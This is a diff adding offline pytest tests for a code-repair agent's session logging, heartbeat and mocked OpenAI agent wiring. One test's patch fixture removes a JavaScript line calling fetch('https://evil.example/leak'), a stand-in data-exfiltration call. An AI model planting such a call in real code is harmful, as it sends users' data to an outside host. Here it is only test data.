@@ -1,4 +1,8 @@
 """repair 内层 agent：会话工具语义 + 节点接线/回退（全部离线，不触网不依赖 SDK）。"""
+import time
+import sys
+from types import ModuleType, SimpleNamespace
+
 import pytest
 
 from app.agents import code_agent, nodes
@@ -80,6 +84,45 @@ def test_session_logs_to_live_step(monkeypatch):
 
     assert s.log_lines[0].startswith("agent read game.js")
     assert calls == [(s.log_lines[0], "step-1")]
+
+
+def test_session_edit_logs_include_line_delta(monkeypatch):
+    calls = []
+    monkeypatch.setattr(
+        code_agent.tracing,
+        "record_step_log",
+        lambda line, *, step_id=None: calls.append(line) or True,
+    )
+    s = code_agent.RepairSession.from_files(_files(), live_step_id="step-1")
+
+    s.apply_patch(
+        "*** Begin Patch\n"
+        "*** Update File: game.js\n"
+        "-var score = 0; fetch('https://evil.example/leak');\n"
+        "+var ok = 1;\n"
+        "+var score = 0;\n"
+        "*** End Patch"
+    )
+
+    assert any(line.startswith("agent patched game.js (+2 -1,") for line in calls)
+
+
+def test_agent_heartbeat_logs_bundle_activity(monkeypatch):
+    monkeypatch.setattr(code_agent.tracing, "record_step_log", lambda line, *, step_id=None: True)
+    s = code_agent.RepairSession.from_files(_files(), live_step_id="step-1")
+
+    stop, thread = code_agent._start_heartbeat(s, agent_name="GameCodeAuthor", interval=0.01)
+    try:
+        for _ in range(30):
+            if s.log_lines:
+                break
+            time.sleep(0.01)
+    finally:
+        code_agent._stop_heartbeat(stop, thread)
+
+    assert any("agent authoring waiting on model response:" in line for line in s.log_lines)
+    assert any("since last tool" in line for line in s.log_lines)
+    assert any("bundle=3 file(s)" in line for line in s.log_lines)
 
 
 def test_session_patch_resets_checks_flag():
@@ -523,6 +566,90 @@ def test_author_enabled_requires_flag_and_real_model(monkeypatch):
 
 def test_run_author_returns_none_for_empty_bundle():
     assert code_agent.run_author([], spec={}, design={}) is None
+
+
+def test_execute_agent_uses_responses_model(monkeypatch):
+    agents_module = ModuleType("agents")
+    exceptions_module = ModuleType("agents.exceptions")
+    captured = {}
+
+    class FakeAgent:
+        def __init__(self, **kwargs):
+            captured["agent"] = kwargs
+
+    class FakeResponsesModel:
+        def __init__(self, *, model, openai_client):
+            captured["model"] = model
+            captured["client"] = openai_client
+
+    class FakeRunConfig:
+        def __init__(self, **kwargs):
+            captured["run_config"] = kwargs
+
+    class FakeRunner:
+        @staticmethod
+        def run_sync(agent, task_input, *, max_turns, run_config):
+            captured["run"] = {
+                "agent": agent,
+                "task_input": task_input,
+                "max_turns": max_turns,
+                "run_config": run_config,
+            }
+            usage = SimpleNamespace(
+                requests=1,
+                input_tokens=11,
+                output_tokens=7,
+                total_tokens=18,
+                input_tokens_details=SimpleNamespace(cached_tokens=0),
+            )
+            return SimpleNamespace(final_output="FIXED: ok", context_wrapper=SimpleNamespace(usage=usage))
+
+    def fake_function_tool(fn):
+        return fn
+
+    agents_module.Agent = FakeAgent
+    agents_module.OpenAIResponsesModel = FakeResponsesModel
+    agents_module.RunConfig = FakeRunConfig
+    agents_module.Runner = FakeRunner
+    agents_module.function_tool = fake_function_tool
+    exceptions_module.AgentsException = RuntimeError
+    exceptions_module.MaxTurnsExceeded = TimeoutError
+
+    openai_module = ModuleType("openai")
+
+    class FakeAsyncOpenAI:
+        def __init__(self, **kwargs):
+            captured["client_kwargs"] = kwargs
+
+        async def close(self):
+            captured["closed"] = True
+
+    openai_module.AsyncOpenAI = FakeAsyncOpenAI
+    monkeypatch.setitem(sys.modules, "agents", agents_module)
+    monkeypatch.setitem(sys.modules, "agents.exceptions", exceptions_module)
+    monkeypatch.setitem(sys.modules, "openai", openai_module)
+    monkeypatch.setattr(code_agent, "available_skills", lambda: [])
+    monkeypatch.setattr(code_agent.llm, "record_usage", lambda *args, **kwargs: None)
+
+    session = code_agent.RepairSession.from_files(_files())
+    outcome = code_agent._execute_agent(
+        session,
+        agent_name="GameCodeRepair",
+        instructions="repair",
+        author_tools=False,
+        task_input="input",
+        turns_limit=5,
+        workflow_name="test-workflow",
+    )
+
+    expected_model = code_agent.settings.CODE_AGENT_MODEL or code_agent.settings.MODEL_NAME
+    assert outcome is not None
+    assert captured["model"] == expected_model
+    assert captured["agent"]["model"].__class__ is FakeResponsesModel
+    assert captured["run"]["max_turns"] == 5
+    assert captured["run_config"] == {"workflow_name": "test-workflow", "tracing_disabled": True}
+    assert captured["client_kwargs"]["base_url"] == code_agent.settings.OPENAI_BASE_URL
+    assert captured["closed"] is True
 
 
 def test_author_input_carries_spec_design_and_runtime():
